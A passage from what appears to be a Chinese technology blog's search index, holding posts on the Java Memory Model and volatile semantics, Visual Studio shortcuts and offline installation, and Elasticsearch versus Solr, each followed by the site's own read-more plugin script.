Execution）优化，处理器会在乱序执行之后的结果进行重组，保证结果的正确性，也就是保证结果与顺序执行的结果一致。但是在真正的执行过程中，代码执行的顺序并不一定按照代码的书写顺序来执行，可能和代码的书写顺序不同。 Java 的内存模型Java 内存模型（Java Memory Model，简称 JMM）是 Java 虚拟机规范定义的，用来屏蔽掉 Java 程序在各种不同的硬件和操作系统对内存的访问的差异，这样就可以实现 Java 程序在各种不同的平台上都能达到内存访问的一致性。避免了像 C++ 等直接使用物理硬件和操作系统的内存模型在不同操作系统和硬件平台下表现不同，比如有些 C/C++ 程序可能在 Windows 平台运行正常，而在 Linux 平台却运行有问题。 虽然 Java 程序所有的运行都是在虚拟机中，涉及到的内存等信息都是虚拟机的一部分，但实际也是物理机的，只不过是虚拟机作为最外层的容器统一做了处理。虚拟机的内存模型，以及多线程的场景下与物理机的情况是很相似的，可以类比参考。Java 内存模型的主要目标是定义程序中变量的访问规则。即在虚拟机中将变量存储到主内存或者将变量从主内存取出这样的底层细节。需要注意的是这里的变量跟平时写 Java 程序中的变量不是完全等同的。这里的变量是指实例字段、静态字段、构成数组对象的元素，但是不包括局部变量和方法参数（因为这是线程私有的）。这里可以简单的认为主内存是 Java 虚拟机内存区域中的堆，局部变量和方法参数是在虚拟机栈中定义的。但是在堆中的变量如果在多线程中都使用，就涉及到了堆和不同虚拟机栈中变量的值的一致性问题了。 Java 内存模型的两个重要概念： 主内存：Java 虚拟机规定所有的变量（不是程序中的变量）都必须在主内存中产生，为了方便理解，可以认为是堆区。可以与前面说的物理机的主内存相比，只不过物理机的主内存是整个机器的内存，而虚拟机的主内存是虚拟机内存中的一部分。 工作内存：Java 虚拟机中每个线程都有自己的工作内存，该内存是线程私有的。为了方便理解，可以认为是虚拟机栈，可以与前面说的高速缓存相比。线程的工作内存保存了线程需要的变量在主内存中的副本。虚拟机规定，线程对主内存变量的修改必须在线程的工作内存中进行，不能直接读写主内存中的变量。不同的线程之间也不能相互访问对方的工作内存。如果线程之间需要传递变量的值，必须通过主内存来作为中介进行传递。 特别说明：主内存、工作内存与 Java 内存区域中的 Java 堆、虚拟机栈、方法区并不是一个层次的内存划分。这两者是基本上是没有关系的，上文只是为了便于理解，做的类比。 工作内存与主内存交互物理机高速缓存和主内存之间有交互协议，同样的，Java 内存中线程的工作内存和主内存的交互是由 Java 虚拟机定义了如下的八种操作来完成的，每种操作必须是原子性的（double 和 long 类型在某些平台有例外）。Java 虚拟机中主内存和工作内存交互，本质就是一个变量如何从主内存传输到工作内存中，如何把修改后的变量从工作内存同步回主内存。 lock（锁定）：作用于主内存的变量，一个变量在同一时间只能被一个线程锁定，该操作表示这条线成独占这个变量 unlock（解锁）：作用于主内存的变量，表示这个变量的状态由处于锁定状态被释放，这样其他线程才能对该变量进行锁定 read（读取）：作用于主内存变量，表示把一个主内存变量的值传输到线程的工作内存，以便随后的 load 操作使用 load（载入）：作用于线程的工作内存的变量，表示把 read 操作从主内存中读取的变量的值放到工作内存的变量副本中（副本是相对于主内存的变量而言的） use（使用）：作用于线程的工作内存中的变量，表示把工作内存中的一个变量的值传递给执行引擎，每当虚拟机遇到一个需要使用变量的值的字节码指令时就会执行该操作 assign（赋值）：作用于线程的工作内存的变量，表示把执行引擎返回的结果赋值给工作内存中的变量，每当虚拟机遇到一个给变量赋值的字节码指令时就会执行该操作 store（存储）：作用于线程的工作内存中的变量，把工作内存中的一个变量的值传递给主内存，以便随后的 write 操作使用 write（写入）：作用于主内存的变量，把 store 操作从工作内存中得到的变量的值放入主内存的变量中 如果要把一个变量从主内存传输到工作内存，那就要顺序的执行 read 和 load 操作，如果要把一个变量从工作内存回写到主内存，就要顺序的执行 store 和 write 操作。对于普通变量，虚拟机只是要求顺序的执行，并没有要求连续的执行，所以如下也是正确的。例如两个线程分别从主内存中读取变量 a 和 b 的值，即执行 read a; load a; read b; load b;，此时可能也会出现如下执行顺序 read a; read b; load b; load a;。这八种操作必须是原子的，不可分割的。 针对于 volatile 修饰的变量，会有一些特殊规则，后边会详细列出。 对于上述八种操作，虚拟机也规定了一系列规则，在执行这八种操作的时候必须遵循如下的规则： 不允许 read 和 load、store 和 write 操作之一单独出现，也就是不允许从主内存读取了变量的值但是工作内存不接收的情况，或者不允许从工作内存将变量的值回写到主内存但是主内存不接收的情况 不允许一个线程丢弃最近的 assign 操作，也就是不允许线程在自己的工作线程中修改了变量的值却不同步 / 回写到主内存 不允许一个线程回写没有修改的变量到主内存，也就是如果线程工作内存中变量没有发生过任何 assign 操作，是不允许将该变量的值回写到主内存 变量只能在主内存中产生，不允许在工作内存中直接使用一个未被初始化的变量，也就是没有执行 load 或者 assign 操作，即执行 use、store 之前必须对相同的变量执行了 load、assign 操作 一个变量在同一时刻只能被一个线程对其进行 lock 操作，也就是说一个线程一旦对一个变量加锁后，在该线程没有释放掉锁之前，其他线程是不能对其加锁的，但是同一个线程对一个变量加锁后，可以继续加锁，同时在释放锁的时候释放锁次数必须和加锁次数相同 对变量执行 lock 操作，就会清空工作内存中该变量的值，执行引擎使用这个变量之前，需要重新 load 或者 assign 操作初始化变量的值 不允许对没有 lock 的变量执行 unlock 操作，如果一个变量没有被 lock 操作，那也不能对其执行 unlock 操作，当然一个线程也不能对被其他线程 lock 的变量执行 unlock 操作 对一个变量执行 unlock 之前，必须先把变量同步回主内存中，也就是执行 store 和 write 操作 volatile 变量volatile 变量的特殊规则关键字 volatile 可以说是 Java 虚拟机中提供的最轻量级的同步机制，Java 内存模型对 volatile 专门定义了一些特殊的访问规则。假定 T 表示一个线程，V 和 W 分别表示两个 volatile 修饰的变量，那么在进行 read、load、use、assign、store 和 write 操作的时候需要满足如下规则： 只有当线程 T 对变量 V 执行的前一个动作是 load，线程 T 对变量 V 才能执行 use 动作；同时只有当线程 T 对变量 V 执行的后一个动作是 use 的时候，线程 T 对变量 V 才能执行 load 操作。所以，线程 T 对变量 V 的 use 动作和线程 T 对变量 V 的 read、load 动作相关联，必须是连续一起出现。也就是在线程 T 的工作内存中，每次使用变量 V 之前必须从主内存去重新获取最新的值，用于保证线程 T 能看得见其他线程对变量 V 的最新的修改后的值。 只有当线程 T 对变量 V 执行的前一个动作是 assign 的时候，线程 T 对变量 V 才能执行 store 动作；同时只有当线程 T 对变量 V 执行的后一个动作是 store 的时候，线程 T 对变量 V 才能执行 assign 动作。所以，线程 T 对变量 V 的 assign 操作和线程 T 对变量 V 的 store、write 动作相关联，必须一起连续出现。也即是在线程 T 的工作内存中，每次修改变量 V 之后必须立刻同步回主内存，用于保证线程 T 对变量 V 的修改能立刻被其他线程看到。 假定动作 A 是线程 T 对变量 V 实施的 use 或 assign 动作，动作 F 是和动作 A 相关联的 load 或 store 动作，动作 P 是和动作 F 相对应的对变量 V 的 read 或 write 动作；类似的，假定动作 B 是线程 T 对变量 W 实施的 use 或 assign 动作，动作 G 是和动作 B 相关联的 load 或 store 动作，动作 Q 是和动作 G 相对应的对变量 W 的 read 或 write 动作。如果动作 A 先于 B，那么 P 先于 Q。也就是说在同一个线程内部，被 volatile 修饰的变量不会被指令重排序，保证代码的执行顺序和程序的顺序相同。 总结上面三条规则：前面两条可以概括为：volatile 类型的变量保证对所有线程的可见性。第三条为：volatile 类型的变量禁止了指令重排优化。 volatile 变量禁止指令重排计算机在执行程序时，为了提高性能，编译器和处理器常常会对指令做重排，一般分为以下三种： 单线程环境里面确保程序最终执行结果和代码顺序执行的结果一致。处理器在进行重排序时必须考虑指令之间的数据依赖性。多线程环境中线程交替执行，由于编译器优化重排的存在，两个线程中使用的变量能否保证一致性是无法确定的，结果无法预测。 普通的变量仅仅会保证在该方法执行的过程中，所有依赖赋值结果的地方都能获取到正确的结果，但不能保证变量赋值的操作顺序和程序代码的顺序一致。因为在一个线程的方法执行过程中无法感知到这一点，这也就是 Java 内存模型中描述的所谓的线程内部表现为串行的语义。也就是在单线程内部，我们看到的或者感知到的结果和代码顺序是一致的；即使代码的执行顺序和代码顺序不一致，但是在需要赋值的时候结果也是正确的，所以看起来就是串行的。但实际结果有可能代码的执行顺序和代码顺序是不一致的，这在多线程代码中就会出现问题。示例代码如下： 12345678910111213141516171819Map configOptions;char[] configText;//volatile类型变量volatile boolean initialized = false;//假设以下代码在线程A中执行//模拟读取配置信息，读取完成后认为是初始化完成configOptions = new HashMap();configText = readConfigFile(fileName);processConfigOptions(configText, configOptions);initialized = true;//假设以下代码在线程B中执行//等待initialized为true后，读取配置信息进行操作while ( !initialized) { sleep();}doSomethingWithConfig(); 在上述代码中，如果 initialiezd 是普通变量，没有被 volatile 修饰，那么线程 A 执行的代码的修改初始化完成的结果 initialized = true 就有可能先于之前的三行代码执行，而此时线程 B 发现 initialized 为 true 了，就执行 doSomethingWithConfig() 方法，但是里面的配置信息都是 Null 的，就会出现问题了。如果 initialized 是 volatile 类型变量，保证禁止代码重排序优化，那么就可以保证 initialized = true 执行的时候，前边的三行代码一定执行完成了，那么线程 B 读取的配置文件信息就是正确的。跟其他保证并发安全的工具相比，volatile 的性能确实会好一些。在某些情况下，volatile 的同步机制性能要优于锁（使用 synchronized 关键字或者 Java.util.concurrent 包中的锁）。但是现在由于虚拟机对锁的不断优化和实行的许多消除动作，很难有一个量化的比较；但与自身比较可以确定一个原则：volatile 变量的读操作和普通变量的读操作几乎没有差异，但是写操作会性能差一些，因为要在本地代码中插入许多内存屏障指令来禁止指令重排序，保证处理器不发生代码乱序执行行为。 volatile 变量保证可见性可见性是指当一个线程修改了这个变量的值，新值（修改后的值）对于其他线程来说是立即可以得知的。正如上面的前两条规则规定，volatile 类型的变量每次值被修改了就立即同步回主内存，每次使用时就需要从主内存重新读取值。返回到前面 JMM 对普通变量的规则中，并没有要求这一点，所以普通变量的值是不会立即对所有线程可见的，即普通变量不具备可见性。volatile 变量保证可见性的验证代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 1 验证volatile的可见性 * 1.1 加入int number=0，number变量之前没有添加volatile关键字修饰，不具备可见性 * 1.2 添加了volatile关键字，可以解决可见性问题 */ public class VolatileTest { public static void main(String[] args) { MyData data = new MyData(); new Thread(() - &gt; { System.out.println(Thread.currentThread().getName() + " thread come in"); try { TimeUnit.SECONDS.sleep(3); } catch(InterruptedException e) { e.printStackTrace(); } data.setNumber(); System.out.println(Thread.currentThread().getName() + " thread set number is " + data.number); }, "AAA").start(); while(data.number == 0) { // main线程一直在这里循环等待，直到number的值不再等于零 } System.out.println(Thread.currentThread().getName() + " thread is over, the number is " + data.number); } } class MyData { // int number = 0; // volatile可以保证可见性，即可以及时通知其他线程，主内存中的变量值已经被修改 volatile int number = 0; public void setNumber() { this.number = 60; } } 123AAA thread come inAAA thread set number is 60main thread is over, the number is 60 volatile 变量不保证原子性常见误解：volatile 变量对所有线程是立即可见的，所以对 volatile 变量的所有修改（写操作）都立刻能反应到其他线程中。或者换句话说：volatile 变量在各个线程中是一致的，所以基于 volatile 变量的运算在并发下是线程安全的。这个观点的论据是正确的，但是根据论据得出的结论是错误的，并不能得出这样的结论。volatile 的规则，保证了 read、load、use 的顺序和连续性，同理 assign、store、write 也是顺序和连续的。也就是这几个动作是原子性的，但是对变量的修改，或者对变量的运算，却不能保证是原子性的。如果对变量的修改是分为多个步骤的，那么多个线程同时从主内存拿到的值是最新的，但是经过多步运算后回写到主内存的值是有可能存在覆盖情况发生的。volatile 变量不保证原子性的验证代码如下： 123456789101112131415161718192021222324252627282930313233343536373839public class VolatileTest{ public static volatile int race = 0; public static void increase() { race++; } private static final int THREADS_COUNT = 20; public static void main(String[] args) { Thread[] threads = new Thread[THREADS_COUNT]; for(int i = 0; i &lt; THREADS_COUNT; i++) { threads[i] = new Thread(new Runnable() { @Override public void run() { for(int j = 0; j &lt; 10000; j++) { increase(); } } }); threads[i].start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println(race); }} 141078 上述代码就是对 volatile 类型的变量启动了 20 个线程，每个线程对变量执行 1w 次加 1 操作，如果 volatile 变量并发操作没有问题的话，那么结果应该是输出 20w，但是结果运行的时候每次都是小于 20w，这就是因为 race++ 操作不是原子性的（图解），是分多个步骤完成的。假设两个线程 a、b 同时取到了主内存的值是 0，这是没有问题的，在进行 ++ 操作的时候假设线程 a 执行到一半，线程 b 执行完了，这时线程 b 立即同步给了主内存，主内存的值为 1，而线程 a 此时也执行完了，同步给了主内存，此时的值仍然是 1，线程 b 的结果被覆盖掉了。 如果需要解决 volatile 不保证原子性的问题，直接使用 AtomicInteger 这样的原子包装类即可保证原子性。示例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839public class VolatileTest{ public static AtomicInteger race = new AtomicInteger(); public static void increase() { race.getAndIncrement(); } private static final int THREADS_COUNT = 20; public static void main(String[] args) { Thread[] threads = new Thread[THREADS_COUNT]; for(int i = 0; i &lt; THREADS_COUNT; i++) { threads[i] = new Thread(new Runnable() { @Override public void run() { for(int j = 0; j &lt; 10000; j++) { increase(); } } }); threads[i].start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println(race); }} long 和 double 变量long 和 double 变量的特殊规则Java 内存模型要求对主内存和工作内存交互的八种操作是原子性的，正如上文所讲，对 long 和 double 有一些特殊规则。八种操作中 lock、unlock、read、load、use、assign、store、write 对待 32 位的基本数据类型都是原子操作，对待 long 和 double 这两个 64 位的数据，Java 虚拟机规范对 Java 内存模型的规定中特别定义了一条相对宽松的规则：允许虚拟机将没有被 volatile 修饰的 64 位数据的读写操作划分为两次 32 位的操作来进行，也就是允许虚拟机不保证对 64 位数据的 read、load、store 和 write 这 4 个动作的操作是原子的。这也就是常说的 long 和 double 的非原子性协定（Nonautomic Treatment of double and long Variables）。 并发内存模型的实质Java 内存模型围绕着并发过程中如何处理原子性、可见性和顺序性这三个特征来设计的。 原子性（Atomicity）： 由 Java 内存模型来直接保证原子性的变量操作包括 read、load、use、assign、store、write 这 6 种操作，虽然存在 long 和 double 的特例，但基本可以忽略不计，目前虚拟机基本都对其实现了原子性。如果需要更大范围的控制，lock 和 unlock 也可以满足需求。lock 和 unlock 虽然没有被虚拟机直接提供给用户使用，但是提供了字节码层次的指令 monitorenter 和 monitorexit 对应这两个操作，对应到 Java 代码就是 synchronized 关键字，因此在 synchronized 块之间的代码都具有原子性。 可见性（Visibility）： 可见性是指一个线程修改了一个变量的值后，其他线程立即可以感知到这个值的修改。正如前面所说，volatile 类型的变量在修改后会立即同步给主内存，在使用的时候会从主内存重新读取，是依赖主内存为中介来保证多线程下变量对其他线程的可见性的。除了 volatile 之外，synchronized 和 final 也可以实现可见性。synchronized 关键字是通过 unlock 之前必须把变量同步回主内存来实现的，final 则是在初始化后就不会更改，所以只要在初始化过程中没有把 this 指针传递出去也能保证对其他线程的可见性。 有序性： 有序性从不同的角度来看是不同的。单纯单线程来看都是有序的，但到了多线程就会跟我们预想的不一样。可以这么说：如果在本线程内部观察，所有操作都是有序的；如果在一个线程中观察另一个线程，所有的操作都是无序的。前半句说的就是线程内表现为串行的语义，后半句指的是指令重排现象和主内存与工作内存之间同步存在延迟的现象。保证有序性的关键字有 volatile 和 synchronized，其中 volatile 禁止了指令重排序，而 synchronized 则由一个变量在同一时刻只能被一个线程对其进行lock操作来保证。 总结：synchronized 对三种特性都有支持，虽然简单，但是如果无控制地滥用对性能就会产生较大影响。volatile 只支持可见性和有序性（禁止指令重排），不支持原子性 先行发生原则如果 Java 内存模型中所有的有序性都要依靠 volatile 和 synchronized 来实现，那是不是非常繁琐。Java 语言中有一个 “先行发生原则”，是判断数据是否存在竞争、线程是否安全的主要依据。 什么是先行发生原则 先行发生原则是 Java 内存模型中定义的两个操作之间的偏序关系。比如说操作 A 先行发生于操作 B，那么在 B 操作发生之前，A 操作产生的 “影响” 都会被操作 B 感知到。这里的影响是指修改了内存中的共享变量、发送了消息、调用了方法等。 Java 内存模型自带先行发生原则有哪些 程序次序原则：在一个线程内部，按照代码的顺序，书写在前面的先行发生与后边的。或者更准确的说是在控制流顺序前面的先行发生与控制流后面的，而不是代码顺序，因为会有分支、跳转、循环等 管程锁定规则：一个 unlock 操作先行发生于后面对同一个锁的 lock 操作。这里必须注意的是对同一个锁，后面是指时间上的后面 volatile变量规则：对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作，这里的后面是指时间上的先后顺序 线程启动规则：Thread 对象的 start () 方法先行发生与该线程的每个动作。当然如果错误的使用了线程，创建线程后没有执行 start 方法，而是执行 run 方法，那此句话是不成立的，但是如果这样其实也不是线程了 线程终止规则：线程中的所有操作都先行发生与对此线程的终止检测，可以通过 Thread.join () 和 Thread.isAlive () 的返回值等手段检测线程是否已经终止执行 线程中断规则：对线程 interrupt () 方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过 Thread.interrupted () 方法检测到是否有中断发生 对象终结规则：一个对象的初始化完成先行发生于他的 finalize 方法的执行，也就是初始化方法先行发生于 finalize 方法 传递性规则：如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那么操作 A 先行发生于操作 C 在下述的代码中，如果有两个线程 A 和 B，A 先调用 setValue 方法，然后 B 调用 getValue 方法，那么 B 线程执行方法返回的结果是什么？ 123456789private int value = 0;public void setValue(int value) { this.value = value;}public int getValue() { return this.value;} 对照先行发生原则一个一个对比。首先是程序次序规则，这里是多线程，不在一个线程中，不适用；然后是管程锁定规则，这里没有 synchronized，自然不会发生 lock 和 unlock，不适用；后面对于线程启动规则、线程终止规则、线程中断规则也不适用，这里与对象终结规则、传递性规则也没有关系。所以说 B 返回的结果是不确定的，也就是说在多线程环境下该操作不是线程安全的。如何修改呢，一个是对 get、set 方法加入 synchronized 关键字，即可以使用管程锁定规则；要么对 value 加 volatile 修饰，可以使用 volatile 变量规则。 通过上面的例子可知，一个操作时间上先发生并不代表这个操作先行发生，那么一个操作先行发生是不是代表这个操作在时间上先发生？也不是，如下面的例子： 12int i = 2;int j = 1; 在同一个线程内，对 i 的赋值先行发生于对 j 赋值的操作，但是代码重排序优化，也有可能是 j 的赋值先发生，我们无法感知到这一变化。综上所述，时间先后顺序与先行发生原则之间基本没有太大关系。我们衡量并发安全的问题的时候不要受到时间先后顺序的干扰，一切以先行发生原则为准。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java"},{title:"Visual Studio 之一常用配置与使用",url:"/posts/ec73e38.html",text:'VS 版本说明本文使用的 Visual Studio 版本是 Microsoft Visual Studio Community 2019 版本 16.11.5。 界面操作添加源码目录将源码目录拷贝到 VS 的工程目录下，这时在 VS 的工程目录列表里是看不到新增的目录的，在如下图工具栏中点击图标 显示所有文件，才可以看到新增的目录 这时新增的源码目录还没有真正地加入到 VS 的工程中来，可见新增的文件的图标是红色的 在新增的源码目录上右键选择 包括在项目中，新增的源码目录就会加入到 VS 的工程中 新增的文件的图标最终才会正常显示 添加预处理器定义若项目编译失败，并输出如下的错误日志信息，则可以导航到菜单栏：项目 -&gt; 属性 -&gt; C/C++ -&gt; 预处理器 -&gt; 预处理器定义 -&gt; 编辑，然后加入 _CRT_SECURE_NO_WARNINGS 和 _CRT_NONSTDC_NO_DEPRECATE 即可。 1错误 C4996 \'fopen\': This function or variable may be unsafe. Consider using fopen_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details. 常用快捷键 f9：设置断点 f5：调试运行 ctrl + f5：只运行，不调试 ctrl + shift + b：只编译，不运行 ctrl + k + c：注释代码 ctrl + k + u：取消注释代码 ctrl + k + f：代码格式化 ctrl + shift + f 或者 ctrl + shift + h：全局搜索文件内容 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"搜索中间件面试题之一",url:"/posts/a03f47f2.html",text:'ElasticSearch 和 Solr 的区别两者都是基于 Lucene 搜索服务器开发的，是一款优秀的、高性能的企业级搜索服务器，且都是基于分词技术构建的倒排索引的方式进行查询，区别如下： 当单纯地对已有数据进行检索的时候，Solr 的效率高于 ES 当实时建立索引的时候，Solr 会产生 IO 阻塞，而 ES 则不会，ES 的查询性能高于 Solr 在不断动态添加数据的时候，Solr 的检索效率会变得低下，而 ES 则没什么变化 Solr 利用 ZooKeeper 进行分布式管理，而 ES 自带分布式管理功能，Solr 一般都要部署到 Web 服务器上（如 Tomcat），启动 Tomcat 的时候需要配置 Tomcat 与 Solr 的关联 Solr 支持更多的数据格式（XML、JSON、CSV 等），而 ES 仅支持 JSON 文件格式 Solr 是传统搜索应用的有力解决方案，但是 ES 更适用于新兴的实时搜索应用 Solr 官网提供的功能更多，而 ES 本身更注重核心功能，高级功能一般由第三方插件提供 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"Visual Studio 2019 离线安装",url:"/posts/f201bf82.html",text:'前言本文介绍的是 VS 离线安装，类似 ISO 安装，可以解决因 Internet 连接不可靠或带宽较低，导致 VS 安装失败的问题。其原理是使用命令行创建安装文件的本地缓存，这样就可以实现一次下载多次安装，节省下载安装文件所花的时间。 VS 离线安装步骤一访问 VS 官网，下载 VS 的安装器 vs_community.exe，选择社区版（免费）即可。 步骤二通过命令行，使用 VS 的安装器 vs_community.exe 创建（下载）安装文件的本地缓存，命令行的各个参数说明如下： --lang：指定语言 -add：下载工作负荷组件 --layout：指定本地缓存存放的目录路径 --includeRecommended：下载推荐的组件 -–includeOptional：下载可选的组件，比较占磁盘空间，不建议使用 1vs_community.exe --layout G:\\VisualStudio\\Packages -add Microsoft.VisualStudio.Workload.ManagedDesktop -add Microsoft.VisualStudio.Workload.NativeDesktop -add Microsoft.VisualStudio.Workload.Universal --includeRecommended --lang en-US zh-CN 若是 C++ 开发，一般选择安装 Microsoft.VisualStudio.Workload.ManagedDesktop、Microsoft.VisualStudio.Workload.NativeDesktop、Microsoft.VisualStudio.Workload.Universal 这三大组件即可，分别对应下图中已勾选的组件，VS 的组件列表可以看这里。 步骤三下载完成后，进入上面命令行中 --layout 参数所指定的文件夹下，双击 vs_setup.exe 进行安装 (adsbygoogle = window.adsbygoogle || []).push({}); 步骤四等待文件提取完成，显示 VS 的安装界面 步骤五选择安装位置，请确保安装位置所在的磁盘有足够的空间，然后点击 安装 按钮开始安装。值得一提的是，这里一般不再需要在安装界面上的 工作负荷、单个组件、语言包 页面里，手动勾选任何内容。 VS 创建 C++ 项目 VS 创建 C++ 项目 VS 各大组件的附录12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879Visual Studio 核心编辑器ID： Microsoft.VisualStudio.Workload.CoreEditor说明： Visual Studio 核心 shell 体验，包括语法感知代码编辑、源代码管理和工作项管理。Azure 开发ID： Microsoft.VisualStudio.Workload.Azure说明：用于开发云应用、创建资源以及生成包括 Docker 支持的容器的 Azure SDK、工具和项目。数据存储和处理ID： Microsoft.VisualStudio.Workload.Data说明： 使用 SQL Server、Azure Data Lake 或 Hadoop 连接、开发和测试数据解决方案。数据科学和分析应用程序ID： Microsoft.VisualStudio.Workload.DataScience说明： 用于创建数据科学应用程序的语言和工具（包括 Python、R 和 F#）。.NET 桌面开发ID： Microsoft.VisualStudio.Workload.ManagedDesktop说明： 使用 C#、Visual Basic 和 F# 生成 WPF、Windows 窗体和控制台应用程序。使用 Unity 的游戏开发ID： Microsoft.VisualStudio.Workload.ManagedGame说明： 使用 Unity（功能强大的跨平台开发环境）创建 2D 和 3D 游戏。使用 C++ 的 Linux 开发ID： Microsoft.VisualStudio.Workload.NativeCrossPlat说明： 创建和调试在 Linux 环境中运行的应用程序。使用 C++ 的桌面开发ID： Microsoft.VisualStudio.Workload.NativeDesktop说明：使用 Microsoft C++ 工具集、ATL 或 MFC 生成 Windows 桌面应用程序。使用 C++ 的游戏开发ID： Microsoft.VisualStudio.Workload.NativeGame说明： 以 DirectX、Unreal 或 Cocos2d 为后盾，利用 C++ 的强大功能生成专业游戏。使用 C++ 的移动开发ID： Microsoft.VisualStudio.Workload.NativeMobile说明： 使用 C++ 生成适用于 iOS、Android 或 Windows 的跨平台应用程序。.NET Core 跨平台开发ID： Microsoft.VisualStudio.Workload.NetCoreTools说明： 使用 .NET Core、ASP.NET Core、HTML/JavaScript 和包括 Docker 支持的容器生成跨平台应用程序。使用 .NET 的移动开发ID： Microsoft.VisualStudio.Workload.NetCrossPlat说明： 使用 Xmarin 生成适用于 iOS、Android 或 Windows 的跨平台应用程序。ASP.NET 和 Web 开发ID： Microsoft.VisualStudio.Workload.NetWeb说明： 使用 ASP.NET、ASP.NET Core、HTML/JavaScript 和包括 Docker 支持的容器生成 Web 应用程序。Node.js 开发ID： Microsoft.VisualStudio.Workload.Node说明： 使用 Node.js（事件驱动的异步 JavaScript 运行时）生成可扩展的网络应用程序。Office/SharePoint 开发ID： Microsoft.VisualStudio.Workload.Office说明： 使用 C#、VB 和 JavaScript 创建 Office 和 SharePoint 外接程序、SharePoint 解决方案和 VSTO 外接程序。Python 开发ID： Microsoft.VisualStudio.Workload.Python说明： 适用于 Python 的编辑、调试、交互式开发和源代码管理。通用 Windows 平台开发ID： Microsoft.VisualStudio.Workload.Universal说明： 使用 C#、VB 和 JavaScript 或 C++（可选）创建适用于通用 Windows 平台的应用程序。Visual Studio 扩展开发ID： Microsoft.VisualStudio.Workload.VisualStudioExtension说明： 创建适用于 Visual Studio 的加载项和扩展，包括新命令、代码分析器和工具窗口。使用 JavaScript 的移动开发ID： Microsoft.VisualStudio.Workload.WebCrossPlat说明： 使用用于 Apache Cordova 的工具生成 Android、iOS 和 UWP 应用。Visual Studio 帮助查看器ID: Microsoft.Component.HelpViewer说明：VS 的帮助查看器。 参考资料 Visual Studio 2019 在线安装 VS2019 离线安装方法详解 Visual Studio 2019 脱机安装 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"Visual Studio 2019 在线安装",url:"/posts/71979ec9.html",text:'下载 VS 安装器访问 VS 官网，选择社区版（免费）进行下载 安装 VS步骤一直接双击 “vs_community.exe” 运行 VS 安装器 步骤二等待文件提取完成，显示 VS 的安装界面 步骤三根据自己的开发需要，选择对应的工作负荷组件，若是开发 C++，一般勾选下图中的三项即可 步骤四选择单个组件，一般情况下这里不需要手动勾选 步骤五选择语言包，建议选择 “中文（简体）” 和 “英语” 步骤六选择安装位置，请确保安装位置所在的磁盘有足够的空间，然后点击 “安装” 按钮开始安装即可 (adsbygoogle = window.adsbygoogle || []).push({}); VS 创建 C++ 项目步骤一运行 VS 的主程序，选择 “创建新项目” 步骤二选择 C++ 的 “空项目”，若没有找到 “空项目”，在语言下拉列表里选择 “C++” 即可 步骤三输入项目名，更改项目的存放路径 步骤四新建 C++ 的源文件 步骤五编写 C++ 代码 123456789#include &lt;iostream&gt;#include &lt;stdlib.h&gt;using namespace std;int main() { cout &lt;&lt; "Hello World" &lt;&lt; endl; system("pause");} 步骤六编译运行 C++ 代码 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发工具"},{title:"Docker-K8S 面试题之一",url:"/posts/3b82844a.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": 